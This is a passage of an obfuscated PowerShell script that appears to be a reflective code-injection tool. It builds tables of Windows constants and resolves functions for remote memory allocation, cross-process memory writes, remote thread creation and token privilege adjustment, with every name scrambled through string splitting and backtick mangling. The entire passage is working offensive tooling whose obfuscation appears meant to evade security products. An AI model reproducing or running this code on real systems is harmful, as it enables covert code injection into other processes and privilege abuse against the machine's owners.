		${wIN`3`2c`OnSta`Nts} | &("{0}{1}{2}" -f'Ad','d-Mem','ber') -MemberType ("{3}{0}{1}{2}" -f'P','rope','rty','Note') -Name ("{6}{2}{10}{8}{0}{9}{3}{4}{7}{5}{1}"-f'TI','E','DLLCHARAC','D','YNAMIC','AS','IMAGE_','_B','IS','CS_','TER') -Value 0x40
		${wiN32`CoNS`T`ANTS} | &("{2}{0}{1}" -f 'dd-Memb','er','A') -MemberType ("{1}{0}{2}"-f'p','NotePro','erty') -Name ("{0}{7}{4}{2}{5}{6}{1}{3}"-f 'IMAGE','_COMP','RI','AT','CHARACTE','ST','ICS_NX','_DLL') -Value 0x100
		${wI`N32`coN`st`ANTS} | &("{0}{2}{1}" -f 'Add','Member','-') -MemberType ("{0}{2}{1}" -f 'Not','ty','eProper') -Name ("{1}{2}{0}"-f'SE','MEM_','RELEA') -Value 0x8000
		${win`32con`sTA`NTs} | &("{0}{1}{3}{2}"-f'A','dd','ber','-Mem') -MemberType ("{0}{2}{3}{1}" -f 'NotePr','y','oper','t') -Name ("{3}{1}{2}{0}" -f'Y','UE','R','TOKEN_Q') -Value 0x0008
		${wIN32cO`NST`An`Ts} | &("{1}{0}{2}"-f 'dd-','A','Member') -MemberType ("{0}{3}{1}{2}" -f 'N','e','Property','ot') -Name ("{3}{5}{4}{1}{6}{0}{2}" -f'E','_PRIVI','S','TOKEN_AD','ST','JU','LEG') -Value 0x0020
		${WI`N32C`O`NsTAN`TS} | &("{2}{1}{0}"-f'r','-Membe','Add') -MemberType ("{3}{2}{0}{1}"-f 'P','roperty','e','Not') -Name ("{0}{3}{2}{1}"-f'S','LED','IVILEGE_ENAB','E_PR') -Value 0x2
		${w`I`N32COn`staNTs} | &("{0}{2}{1}"-f 'A','r','dd-Membe') -MemberType ("{0}{1}{2}"-f'No','tePrope','rty') -Name ("{3}{0}{2}{1}"-f'RRO','N','R_NO_TOKE','E') -Value 0x3f0
		
		return ${wiN32C`ON`STAn`Ts}
	}

	Function g`ET-W`IN32`FUNcti`o`Ns
	{
		${WiN32Func`T`i`oNs} = &("{2}{1}{0}" -f'ect','-Obj','New') ("{0}{2}{1}{3}" -f 'System.Obj','c','e','t')
		
		${vIr`Tu`ALaLlO`caDdR} = &("{3}{2}{1}{0}{4}" -f's','dre','et-ProcAd','G','s') ("{1}{3}{2}{0}" -f 'l','k','32.dl','ernel') ("{0}{1}{2}{3}"-f'V','irtua','lA','lloc')
		${vIrT`UA`lAL`LoCdeLegaTE} = &("{1}{2}{0}{3}" -f'teTyp','Get-Del','ega','e') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${vIrtU`A`la`LLOc} =   (vARiablE  ("J"+"K"+"5mbh") )."V`ALuE"::("{0}{1}{5}{4}{6}{3}{2}" -f'Ge','tDel','r','nPointe','gateF','e','orFunctio').Invoke(${vi`Rt`UALa`lL`ocaddr}, ${v`irT`UaLA`L`LOCdel`Egate})
		${Win32FUN`ct`I`oNs} | &("{2}{0}{1}"-f 'd-M','ember','Ad') ("{2}{0}{1}" -f 'otePrope','rty','N') -Name ("{1}{3}{2}{0}"-f 'loc','V','alAl','irtu') -Value ${vI`R`TuAla`lloc}
		
		${vI`RTuALALL`ocEXAd`DR} = &("{3}{2}{1}{0}"-f 'ess','cAddr','Pro','Get-') ("{1}{3}{2}{0}"-f'l','kern','32.dl','el') ("{2}{1}{0}"-f 'alAllocEx','tu','Vir')
		${VIRTuaL`ALloC`exdEle`gA`Te} = &("{3}{0}{2}{1}"-f '-','egateType','Del','Get') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${VI`RtU`A`LallO`CeX} =   ${Jk`5`mbH}::("{1}{2}{4}{8}{0}{6}{7}{5}{3}" -f'Func','G','etDe','ter','lega','oin','tio','nP','teFor').Invoke(${vIr`TU`Al`ALL`OcExadDR}, ${VI`Rt`UAlal`lo`CeXd`e`LEGATe})
		${wi`N`32func`Ti`OnS} | &("{0}{2}{1}" -f'Add-','ember','M') ("{3}{2}{1}{0}" -f 'y','rt','ope','NotePr') -Name ("{4}{0}{2}{3}{1}" -f 'r','cEx','tualAl','lo','Vi') -Value ${VIrTual`All`o`C`eX}
		
		${Me`McPyaD`dr} = &("{3}{2}{4}{0}{1}" -f'dres','s','t-Pro','Ge','cAd') ("{2}{0}{1}"-f'crt.','dll','msv') ("{2}{0}{1}" -f 'c','py','mem')
		${m`Emcp`Y`dElE`gAte} = &("{0}{2}{1}" -f'Get-DelegateTy','e','p') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${MEm`CPy} =  (  lS ('vA'+'r'+'IA'+'BlE:'+'Jk5mBh')  )."v`ALue"::("{4}{3}{1}{2}{0}"-f 'onPointer','or','Functi','F','GetDelegate').Invoke(${mem`Cp`Ya`DDr}, ${m`EmcpyDElE`G`A`TE})
		${WiN3`2FUncTi`o`NS} | &("{2}{1}{3}{0}" -f 'r','d-Mem','Ad','be') -MemberType ("{2}{0}{1}{3}" -f 'Prop','ert','Note','y') -Name ("{0}{1}{2}"-f'me','mcp','y') -Value ${m`EMcpy}
		
		${ME`MsETAd`DR} = &("{1}{0}{2}{3}"-f'oc','Get-Pr','A','ddress') ("{1}{0}{2}" -f 'crt.','msv','dll') ("{1}{0}"-f'et','mems')
		${MEm`sET`DeLeGA`TE} = &("{3}{4}{2}{0}{1}"-f 'eg','ateType','el','Ge','t-D') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${M`E`mset} =  (  varIABle  ("{0}{1}"-f'Jk5','Mbh')  -val  )::("{4}{2}{1}{3}{8}{7}{0}{6}{5}"-f 'ct','el','D','e','Get','ointer','ionP','eForFun','gat').Invoke(${ME`MS`eTad`dr}, ${meM`seT`d`eLEgATe})
		${wI`N32`FU`NcTi`ons} | &("{2}{0}{1}" -f'emb','er','Add-M') -MemberType ("{1}{2}{3}{0}"-f 'y','Note','Prope','rt') -Name ("{0}{1}" -f'mem','set') -Value ${mEm`SeT}
		
		${lOaD`lIBR`AR`YA`DDr} = &("{2}{3}{0}{1}"-f'P','rocAddress','Ge','t-') ("{0}{1}{3}{2}" -f'kern','el','l','32.dl') ("{1}{2}{3}{0}"-f'aryA','Load','Lib','r')
		${LoADLiBraRydeL`e`Ga`Te} = &("{3}{2}{0}{1}"-f 'ateTyp','e','Deleg','Get-') @([String]) ([IntPtr])
		${L`OADli`BRARY} =   ${J`K5mBh}::("{2}{1}{4}{3}{0}"-f 'ointer','l','GetDe','nctionP','egateForFu').Invoke(${lOadl`I`Br`Ar`yaDdR}, ${loAdliBrA`RYd`eLeg`Ate})
		${WiN32f`U`N`cTiOnS} | &("{1}{2}{0}" -f'er','Add','-Memb') -MemberType ("{0}{1}{2}"-f 'No','teP','roperty') -Name ("{2}{1}{0}" -f 'rary','dLib','Loa') -Value ${L`OA`Dli`BRARy}
		
		${GetPR`oC`ADdREsS`A`d`DR} = &("{2}{0}{3}{4}{1}" -f 'ocA','ess','Get-Pr','d','dr') ("{0}{3}{2}{1}"-f 'kerne','l','.dl','l32') ("{3}{1}{2}{4}{0}"-f 'ss','roc','Addr','GetP','e')
		${G`eTp`R`OCADdRE`ssD`El`EGate} = &("{1}{0}{2}{4}{3}" -f't-Delegat','Ge','e','pe','Ty') @([IntPtr], [String]) ([IntPtr])
		${G`EtpR`oCad`drESs} =  (  get-ChILdITem  ("{3}{1}{2}{0}" -f 'Mbh','L','e:Jk5','vArIaB'))."VAl`Ue"::("{0}{5}{2}{1}{4}{3}" -f 'GetDeleg','ctio','un','ointer','nP','ateForF').Invoke(${gE`TPR`Oc`ADdREs`sAdDR}, ${G`ET`P`ROCAddRES`sD`eLE`Gate})
		${WIN32`F`U`NcTIonS} | &("{1}{2}{0}{3}"-f'em','Ad','d-M','ber') -MemberType ("{2}{0}{1}"-f 'r','operty','NoteP') -Name ("{0}{1}{3}{2}{4}"-f'G','etPro','es','cAddr','s') -Value ${gE`TPRocaDD`R`eSS}
		
		${g`etpRo`cA`DDReS`sorDiNaladdr} = &("{3}{1}{2}{0}" -f 's','t-Pro','cAddres','Ge') ("{1}{0}{2}"-f'nel32','ker','.dll') ("{1}{2}{0}"-f 'Address','GetPr','oc')
		${GETpr`O`c`AdDResS`Ordi`NA`L`dELEGa`TE} = &("{3}{0}{1}{2}"-f 'elegateT','yp','e','Get-D') @([IntPtr], [IntPtr]) ([IntPtr])
		${gET`PRo`Ca`dDr`ESSoR`di`NAl} =   (GeT-chILdItem ("{3}{4}{0}{2}{1}" -f'le:j','5mBh','k','vAr','iaB')  )."V`Alue"::("{1}{2}{0}{3}{4}" -f'ti','GetDeleg','ateForFunc','onPoin','ter').Invoke(${get`PROc`A`DdRESSor`d`iNalA`ddR}, ${geT`pROcadDRE`Ss`OR`DiNA`LD`Eleg`A`Te})
		${wI`N`32fUN`ctIOnS} | &("{3}{2}{1}{0}" -f'ber','-Mem','dd','A') -MemberType ("{0}{2}{1}{3}"-f'N','ope','otePr','rty') -Name ("{5}{1}{3}{4}{0}{2}"-f'din','Add','al','res','sOr','GetProc') -Value ${Ge`T`Pro`CAddreSsORdiN`Al}
		
		${vIrTU`Al`FreEad`dr} = &("{2}{0}{1}{3}" -f'A','ddres','Get-Proc','s') ("{1}{0}{2}{3}"-f'ne','ker','l32.dl','l') ("{2}{3}{0}{1}" -f'Fr','ee','V','irtual')
		${VI`Rtu`ALf`ReEDeLeGA`Te} = &("{1}{2}{0}{3}"-f 'e','G','et-Del','gateType') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${ViRtU`ALF`R`eE} =  ( gET-VariaBlE ("jK5m"+"bH") )."v`AlUe"::("{1}{4}{0}{3}{5}{6}{2}" -f'te','GetDel','ionPointer','For','ega','F','unct').Invoke(${ViRT`UalF`RE`e`AdDR}, ${v`i`R`T`U`AlFREEdE`lEGATe})
		${wi`N`32F`UNC`TiOns} | &("{2}{0}{1}"-f 'Memb','er','Add-') ("{1}{2}{0}" -f 'eProperty','No','t') -Name ("{3}{1}{0}{2}" -f 'Fre','ual','e','Virt') -Value ${VI`RT`UaLFREE}
		
		${vI`RTUaLFrE`e`EX`A`ddr} = &("{2}{0}{1}{3}" -f 'ocAd','dre','Get-Pr','ss') ("{1}{2}{0}" -f'2.dll','ke','rnel3') ("{0}{1}{2}" -f 'Virtua','lFre','eEx')
		${VirtU`A`LfR`eEexd`El`EGa`Te} = &("{1}{0}{2}{3}{4}"-f 'e','G','t-','Del','egateType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${vIrTUa`l`F`ReeeX} =  ( geT-vARiAbLe ("{0}{1}" -f'Jk5','mbH') -VAlu )::("{7}{6}{1}{3}{8}{2}{0}{5}{4}" -f'unc','e','orF','ga','Pointer','tion','l','GetDe','teF').Invoke(${V`IrtUa`lf`ReEEXaDdR}, ${viR`Tu`AlfReEeXd`ELEg`AtE})
		${w`in32fun`ctI`onS} | &("{2}{1}{0}"-f'r','be','Add-Mem') ("{0}{2}{1}"-f'N','rty','otePrope') -Name ("{0}{1}{2}" -f 'Vi','r','tualFreeEx') -Value ${V`Ir`TuaLFREeEx}
		
		${vIRtU`AlPr`o`TE`CTaDDR} = &("{2}{1}{0}"-f'dress','ProcAd','Get-') ("{1}{2}{3}{0}"-f 'll','ke','rne','l32.d') ("{2}{3}{1}{0}"-f'tect','ro','Vir','tualP')
		${v`irT`UaLprO`TEc`TD`El`EGATe} = &("{2}{4}{1}{0}{3}"-f'Typ','legate','G','e','et-De') @([IntPtr], [UIntPtr], [UInt32],   (  VARIable  ("{0}{1}" -f'rtB','Df')  )."va`LUE".("{3}{0}{1}{2}" -f'Ref','T','ype','MakeBy').Invoke()) ([Bool])
		${v`irtUaL`p`RoT`ECT} =   (  GEt-vArIaBle ('jk5'+'MbH')  )."Va`LUE"::("{1}{5}{4}{2}{3}{0}{7}{6}" -f 'nt','GetDelegat','ionPo','i','ForFunct','e','r','e').Invoke(${v`IRTuALp`RO`TEcTaDdR}, ${VIrTUAlpr`o`TE`ctd`el`e`GatE})
		${WIN`32F`UNcti`oNS} | &("{0}{1}{3}{2}" -f'Ad','d-Me','r','mbe') ("{1}{2}{0}" -f 'erty','N','oteProp') -Name ("{2}{4}{1}{0}{3}"-f'te','ualPro','Vi','ct','rt') -Value ${V`IRTUA`lpR`o`TeCt}
		
		${getM`odUleha`N`dlEaDdr} = &("{0}{1}{4}{3}{2}" -f'Get-','P','ss','e','rocAddr') ("{3}{0}{2}{1}" -f 'e','l','l32.dl','kern') ("{0}{1}{3}{4}{2}"-f 'Ge','tMo','andleA','dul','eH')
		${ge`TM`Odu`leHanDLe`de`lEGate} = &("{0}{2}{1}{3}{4}" -f'Get','legat','-De','e','Type') @([String]) ([IntPtr])
		${GetM`OD`U`leHand`LE} =   ( childitEm ("vA"+"Ri"+"a"+"bLE:Jk5Mb"+"h") )."V`ALuE"::("{0}{4}{5}{2}{1}{3}"-f 'GetDelegateF','Poin','ion','ter','orF','unct').Invoke(${gEt`MO`D`ULeH`AnDlEAd`DR}, ${G`eT`M`ODU`LeHa`NDLedELe`gAtE})
		${WIN32FU`N`CT`i`ONS} | &("{1}{0}{2}"-f'-M','Add','ember') ("{0}{1}{2}{3}" -f'Note','Pr','opert','y') -Name ("{2}{1}{3}{0}"-f 'dle','odu','GetM','leHan') -Value ${gETMO`dUleH`A`NDlE}
		
		${f`REE`liBR`AR`yAdDr} = &("{4}{2}{3}{1}{0}" -f 'ss','dre','roc','Ad','Get-P') ("{0}{2}{1}"-f'kernel','l','32.dl') ("{2}{3}{1}{0}" -f'y','r','Fre','eLibra')
		${freELIbr`ARY`DEL`Ega`TE} = &("{3}{1}{0}{2}"-f 'DelegateTyp','t-','e','Ge') @([IntPtr]) ([Bool])
		${FrEE`L`Ibra`RY} =   ${JK`5m`BH}::("{3}{2}{4}{0}{1}{6}{5}"-f'teF','orFunct','ele','GetD','ga','Pointer','ion').Invoke(${FREel`iBraRy`AdDr}, ${FReel`IBR`ARy`dELEGate})
		${wIn3`2`F`UNCt`IoNs} | &("{2}{1}{0}" -f'mber','-Me','Add') -MemberType ("{2}{0}{1}" -f 'otePr','operty','N') -Name ("{2}{3}{0}{1}"-f'ibr','ary','Fr','eeL') -Value ${frEe`lIbr`ARy}
		
		${op`ENPro`ceSsad`dr} = &("{2}{0}{3}{1}" -f '-','s','Get','ProcAddres') ("{0}{2}{1}" -f 'kerne','2.dll','l3') ("{2}{1}{3}{0}" -f 's','nProc','Ope','es')
	    ${o`penpR`oC`ESSdelE`gAte} = &("{2}{3}{0}{4}{1}"-f 'eg','e','G','et-Del','ateTyp') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${opE`NP`RoCEsS} =  (  vAriAblE  ("{1}{0}" -f'k5mbh','J')  -Va)::("{0}{1}{2}{3}{4}" -f 'GetD','elegateF','orFunc','tionPoi','nter').Invoke(${OPeNP`RoC`eSS`ADdR}, ${O`p`eNPro`CeSsdELE`GA`TE})
		${W`in32`F`UncTi`onS} | &("{1}{0}{2}"-f 'Me','Add-','mber') -MemberType ("{1}{2}{0}"-f'perty','Note','Pro') -Name ("{2}{0}{1}" -f'r','ocess','OpenP') -Value ${OpENPR`o`ce`ss}
		
		${WA`ITfO`R`SING`lEOBJEcTADdR} = &("{0}{3}{2}{1}" -f 'Get','ss','Addre','-Proc') ("{0}{2}{1}" -f'k','el32.dll','ern') ("{1}{2}{3}{0}" -f 'Object','WaitForSin','g','le')
	    ${waIt`F`o`RS`IN`GLE`Objec`Td`ELEgAtE} = &("{3}{2}{0}{1}" -f'Typ','e','e','Get-Delegat') @([IntPtr], [UInt32]) ([UInt32])
	    ${WaiT`FOR`SinGLE`OB`J`ECt} =  ( gCI ("{0}{4}{2}{3}{1}"-f 'vAriA','H','le:J','k5MB','b') )."vA`LUE"::("{4}{3}{6}{7}{5}{8}{2}{0}{1}"-f 'nPointe','r','o','g','GetDele','Funct','ate','For','i').Invoke(${W`AiTFoRSI`N`Gl`eOB`JE`CtaDDr}, ${WaitF`Ors`INGlEObjeC`TD`el`EgAte})
		${W`IN`32`FUncT`ioNS} | &("{0}{2}{1}"-f 'Add-Mem','r','be') -MemberType ("{0}{1}{2}{3}"-f 'NotePro','pe','r','ty') -Name ("{1}{4}{0}{2}{3}" -f'ForS','W','in','gleObject','ait') -Value ${waI`TFo`Rsing`LEo`BJ`EcT}
		
		${w`R`itEP`ROCeSsMemORY`ADdR} = &("{3}{1}{2}{0}" -f'ess','t-Proc','Addr','Ge') ("{2}{0}{1}"-f'3','2.dll','kernel') ("{3}{5}{1}{2}{4}{0}"-f 'emory','r','oces','W','sM','riteP')
        ${W`R`ItEPrOcESs`mEmORYd`eL`EgaTE} = &("{5}{2}{1}{4}{0}{3}"-f'ateTyp','el','-D','e','eg','Get') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  ( lS ("{1}{2}{0}" -f'blE:t72z','V','aria'))."vA`lUe".("{3}{0}{1}{2}"-f 'akeBy','Ref','Type','M').Invoke()) ([Bool])
        ${wrIT`EproCeSSme`mO`Ry} =  ${j`K5`mBh}::("{0}{5}{1}{4}{3}{2}{7}{6}" -f'Ge','g','ctionPoin','n','ateForFu','tDele','r','te').Invoke(${wRiT`EprOCe`SSMEMo`Rya`d`DR}, ${writEP`ROCE`S`SmeMory`dEL`EG`AtE})
		${w`iN`32FuncTiO`Ns} | &("{0}{1}{2}" -f 'Add-','Membe','r') -MemberType ("{0}{1}{3}{2}" -f'Not','ePro','ty','per') -Name ("{3}{2}{0}{1}{4}" -f 'rocessM','e','eP','Writ','mory') -Value ${Wr`iTePrOc`eS`s`mEMo`RY}
		
		${R`EADp`RO`cESsm`em`ORyADdr} = &("{2}{0}{4}{1}{3}"-f'-','oc','Get','Address','Pr') ("{2}{0}{1}{3}"-f'ern','e','k','l32.dll') ("{5}{2}{0}{1}{4}{3}" -f 'd','Proces','ea','emory','sM','R')
        ${r`E`A`Dpro`c`eSsm`EmO`RyDE`LEGAte} = &("{3}{0}{1}{2}" -f 't-','Del','egateType','Ge') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   ( VARiAbLE ("{1}{0}" -f '2Z','T7') -ValuEONl ).("{2}{1}{0}" -f'ype','akeByRefT','M').Invoke()) ([Bool])
        ${r`Ea`dP`ROCeSSmEMOry} =  ${j`K5m`Bh}::("{5}{2}{4}{1}{3}{0}" -f'Pointer','ateF','tDe','orFunction','leg','Ge').Invoke(${rEadPR`oceSsmE`MOr`y`AdDr}, ${R`EA`d`PROc`ES`SMemORydEleGaTE})
		${w`IN3`2funCT`Io`Ns} | &("{1}{3}{0}{2}"-f 'e','Add','r','-Memb') -MemberType ("{0}{3}{1}{2}" -f 'Note','opert','y','Pr') -Name ("{1}{0}{4}{2}{3}"-f'ro','ReadP','sMe','mory','ces') -Value ${rEADPR`ocESS`m`E`mOrY}
		
		${cReAt`ER`EmoTe`TH`ReADAddR} = &("{2}{1}{3}{0}{4}"-f 'ocAddres','t-','Ge','Pr','s') ("{2}{0}{3}{1}" -f 'r','el32.dll','ke','n') ("{4}{0}{5}{2}{3}{1}" -f'r','hread','t','eT','C','eateRemo')
        ${CREA`TE`R`emoTeT`HREAd`dEl`EgaTe} = &("{0}{3}{2}{1}"-f'Get','pe','Ty','-Delegate') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${c`ReaTERE`m`ot`EtHRe`Ad} =   (GET-vAriabLe  ("{2}{0}{1}"-f 'b','h','jK5M') -Val  )::("{5}{1}{2}{0}{3}{4}{6}" -f 'Fun','DelegateF','or','cti','onPointe','Get','r').Invoke(${C`REatER`EmoTE`ThreA`d`ADdr}, ${C`RE`AtE`RemOTetH`READ`dELEgA`TE})
		${W`IN32FuNCT`iOnS} | &("{2}{0}{1}" -f'dd-Mem','ber','A') -MemberType ("{2}{1}{0}" -f'y','opert','NotePr') -Name ("{4}{1}{2}{5}{0}{3}"-f'ea','eat','eRemoteT','d','Cr','hr') -Value ${crE`ATE`Re`mOt`E`ThReaD}
		
		${gE`TExIT`cOdE`T`hRe`ADAdDr} = &("{3}{1}{2}{0}" -f'ss','rocAd','dre','Get-P') ("{2}{1}{3}{0}" -f 'll','ernel','k','32.d') ("{0}{2}{3}{1}{4}"-f'Ge','t','tEx','i','CodeThread')
        ${g`Et`E`XiTC`o`DETHReADDEL`EGATe} = &("{3}{2}{0}{1}" -f'ateTyp','e','eg','Get-Del') @([IntPtr],   ( gCI  ("{2}{0}{1}{3}" -f 'A','RiaB','v','LE:Q97')  )."va`LuE".("{1}{3}{2}{0}" -f'fType','Mak','Re','eBy').Invoke()) ([Bool])
        ${geTex`it`CodetH`REAd} =  (  ItEM  ("{0}{2}{3}{1}"-f 'vaRIabl','5mbH','E:J','k'))."v`AlUE"::("{2}{1}{3}{6}{5}{8}{0}{4}{7}" -f 'Po','e','G','tDelegateFo','inte','uncti','rF','r','on').Invoke(${g`eTE`xItCo`DE`ThR`eaDa`ddR}, ${g`ETExITc`odetH`R`E`AdDeLEGA`Te})
		${WiN32`FU`NCt`ionS} | &("{2}{0}{1}" -f'Mem','ber','Add-') -MemberType ("{2}{1}{3}{0}"-f'y','oteProp','N','ert') -Name ("{0}{1}{2}{3}"-f 'GetE','x','itCodeThr','ead') -Value ${GeTE`x`itcoDE`THReaD}
		
		${oPE`NThREadtOk`E`Na`DdR} = &("{1}{3}{0}{2}{4}"-f'A','G','ddre','et-Proc','ss') ("{0}{1}{2}" -f 'A','dvapi32','.dll') ("{2}{3}{1}{0}"-f 'dToken','a','O','penThre')
        ${op`eN`ThReA`dtOkENdeL`eGATe} = &("{0}{2}{1}{4}{3}" -f'G','D','et-','ype','elegateT') @([IntPtr], [UInt32], [Bool],  (VarIABle  ('JP'+'7d') -vALueO).("{1}{2}{0}{3}"-f 'yRe','M','akeB','fType').Invoke()) ([Bool])
        ${Op`eN`Thr`Ea`dtOKen} =   (GeT-VaRIAblE  ("j"+"k5"+"MBh")  )."VA`LUE"::("{6}{1}{7}{8}{0}{5}{4}{2}{3}" -f 'eFor','e','nP','ointer','io','Funct','G','tD','elegat').Invoke(${o`P`en`THrEAdTo`Ken`ADdr}, ${o`Pe`NTHrEa`DTok`eNDEL`eGa`TE})
		${wI`N3`2fUNc`TiO`Ns} | &("{2}{1}{0}" -f'mber','e','Add-M') -MemberType ("{3}{0}{2}{1}" -f'Pr','erty','op','Note') -Name ("{3}{2}{0}{1}"-f 'ThreadToke','n','pen','O') -Value ${oP`eNT`hRea`d`TOKeN}
		
		${Getc`UrReNTt`h`R`EA`da`DDR} = &("{3}{0}{1}{2}"-f '-Pr','oc','Address','Get') ("{1}{0}{2}{3}"-f'rnel3','ke','2','.dll') ("{3}{0}{4}{1}{2}" -f 'r','tTh','read','GetCu','ren')
        ${GeTcUr`RENtthrEa`ddE`l`E`G`A`Te} = &("{3}{4}{1}{2}{0}"-f'Type','lega','te','Get-','De') @() ([IntPtr])
        ${G`e`Tcu`RrEnTTH`READ} =  ${j`K5`Mbh}::("{0}{1}{3}{2}{5}{7}{4}{6}" -f 'Get','Del','Fo','egate','n','rF','ctionPointer','u').Invoke(${GE`TcurrEN`TtHrE`AdAD`DR}, ${G`e`T`cuRReNTTHRE`Adde`LeGaTe})
		${W`iN32Fu`N`CTIOns} | &("{0}{2}{1}"-f 'Ad','-Member','d') -MemberType ("{2}{0}{1}{3}"-f'tePro','pe','No','rty') -Name ("{0}{2}{1}{3}"-f 'Get','tThre','Curren','ad') -Value ${GE`TcuRrEn`TT`H`Read}
		
		${ADJus`Tto`K`EnprivI`leG`E`S`AdDr} = &("{0}{2}{3}{1}" -f 'Get-Pr','dress','o','cAd') ("{0}{2}{1}"-f 'Adv','.dll','api32') ("{4}{1}{3}{0}{2}" -f'nPrivi','d','leges','justToke','A')
        ${a`DJUsTToKe`Np`R`IvIl`EgeSdE`L`EG`Ate} = &("{4}{0}{3}{2}{1}"-f 'el','pe','y','egateT','Get-D') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${AdJU`sttO`ke`NPriviL`egES} =   ${jk5m`Bh}::("{0}{4}{3}{2}{5}{6}{1}"-f 'Get','er','egateFor','l','De','Function','Point').Invoke(${ADJustt`oKeNPriv`IlegE`s`A`ddR}, ${adJUs`TtoK`e`NpRIvilE`g`esdELEg`ATe})
		${win`3`2`FunCTiO`Ns} | &("{3}{0}{2}{1}"-f'dd-Me','er','mb','A') -MemberType ("{1}{2}{0}"-f 'y','No','tePropert') -Name ("{0}{4}{5}{6}{2}{1}{3}" -f 'A','nPriv','ke','ileges','dj','us','tTo') -Value ${Ad`jU`Stto`ken`Priv`ilEGEs}
		
		${LOoKu`Ppr`iv`i`LE`gEVaL`UeADDr} = &("{1}{0}{2}{3}" -f'ocAd','Get-Pr','d','ress') ("{1}{3}{2}{0}" -f'32.dll','A','pi','dva') ("{3}{0}{1}{5}{2}{4}" -f'pP','rivilege','lu','Looku','eA','Va')
        ${LoO`Ku`PPRiVIlEG`ev`A`l`UedELeGate} = &("{0}{3}{1}{2}" -f 'Get','lega','teType','-De') @([String], [String], [IntPtr]) ([Bool])
        ${loOK`U`pPr`iVI`LeGEVaL`UE} =  ${j`K`5mBh}::("{3}{7}{0}{6}{1}{5}{2}{4}" -f'egateFor','P','nte','GetDe','r','oi','Function','l').Invoke(${l`O`OK`U`PpRiVILeGEVaLUEaDDR}, ${lOo`k`UpPri`ViLegEVAlUeDe`L`eGate})
		${WIn3`2FUNct`IO`NS} | &("{2}{1}{0}" -f 'ber','Mem','Add-') -MemberType ("{3}{2}{1}{0}" -f'ty','er','op','NotePr') -Name ("{0}{1}{2}{5}{3}{4}"-f'L','ook','up','rivile','geValue','P') -Value ${lOoK`U`Ppr`i`VI`l`egevaLUe}
		
		${i`MPErsOn`AT`ESEl`Fad`dR} = &("{0}{1}{2}"-f 'Get-Pro','cAddr','ess') ("{0}{1}{3}{2}"-f'Advap','i','l','32.dl') ("{4}{0}{2}{3}{1}" -f 'r','elf','sona','teS','Impe')
        ${ImpERs`onATE`se`Lfd`eLe`gAte} = &("{3}{0}{1}{2}{4}"-f 't-Delega','te','Typ','Ge','e') @([Int32]) ([Bool])
        ${i`MPe`RS`OnateSE`lF} =   (ls ('Var'+'I'+'A'+'bLe'+':JK5MbH') )."vaL`Ue"::("{2}{1}{4}{7}{6}{0}{3}{5}" -f'ti','t','Ge','onPo','Deleg','inter','orFunc','ateF').Invoke(${Im`p`eRSo`NA`TEsElfadDr}, ${ImPe`R`s`O`NaT`es`E`lfdEleGaTe})
		${W`iN32f`UnCt`ionS} | &("{1}{0}{2}" -f'dd-Membe','A','r') -MemberType ("{0}{1}{2}{3}"-f 'No','teP','rop','erty') -Name ("{3}{2}{1}{0}"-f'f','onateSel','mpers','I') -Value ${iMpE`R`sOnAT`EsELF}
		
        if ((  (GET-VaRiAblE ("{1}{0}" -f '9','d7i')  )."v`AlUE"::"OSVe`R`S`IOn"."Ve`RsiON" -ge (&("{0}{2}{1}" -f 'N','bject','ew-O') ("{2}{1}{0}"-f'on','si','Ver') 6,0)) -and (  ( vARiABlE  ("d"+"7i9") )."va`luE"::"OsV`erSioN"."VE`R`SioN" -lt (&("{0}{1}{3}{2}"-f 'New','-O','ect','bj') ("{2}{1}{0}"-f 'ion','rs','Ve') 6,2))) {
		    ${NTcr`EateT`Hr`ead`EXADDr} = &("{2}{0}{1}{3}"-f'rocAdd','res','Get-P','s') ("{2}{1}{0}" -f 'l','dl','NtDll.') ("{3}{0}{2}{1}"-f'reateThr','dEx','ea','NtC')
            ${nt`cReAT`eThREaDEXDelEG`A`TE} = &("{1}{0}{2}{3}{4}" -f'D','Get-','e','legateT','ype') @(  ${J`P7d}.("{2}{3}{0}{1}"-f'ef','Type','M','akeByR').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${n`TcrE`ATe`ThrE`Adex} =   ${J`k5mbH}::("{3}{2}{0}{4}{1}" -f'nc','onPointer','tDelegateForFu','Ge','ti').Invoke(${N`Tc`R`eaT`eThrEAD`E`xAddr}, ${ntCrEa`TET`Hre`AdEXDe`le`g`AtE})
		    ${W`i`N`32fUnCTIoNS} | &("{1}{2}{0}{3}"-f'Memb','A','dd-','er') -MemberType ("{1}{3}{2}{0}" -f 'ty','Note','roper','P') -Name ("{2}{0}{1}{3}" -f 'Cre','ateT','Nt','hreadEx') -Value ${ntcReAt`e`THr`eaDex}
        }
		
		${iSW`oW6`4`P`ROCEs`sAddr} = &("{2}{0}{3}{4}{1}"-f 't','ress','Ge','-Pro','cAdd') ("{2}{3}{1}{0}"-f'll','2.d','Kerne','l3') ("{1}{2}{3}{0}{4}"-f'4Proce','IsWo','w','6','ss')
        ${i`S`WO`W64Pro`cEssD`eLeGA`TE} = &("{3}{4}{0}{1}{2}" -f 't','-DelegateTyp','e','G','e') @([IntPtr],   (  gET-chilDiTEm  ("{2}{0}{1}"-f 't7C','j','VaRiAbLE:')  )."val`Ue".("{3}{2}{1}{0}" -f'Type','f','e','MakeByR').Invoke()) ([Bool])
        ${IS`WoW6`4pROcE`SS} =   (  lS  ("vAr"+"iA"+"blE:Jk5M"+"Bh"))."vA`luE"::("{5}{3}{2}{4}{0}{6}{1}" -f 'orFu','ctionPointer','tDelega','e','teF','G','n').Invoke(${ISWO`W64prOcE`sSA`dDR}, ${Is`WOw6`4proCESS`dELeg`AtE})
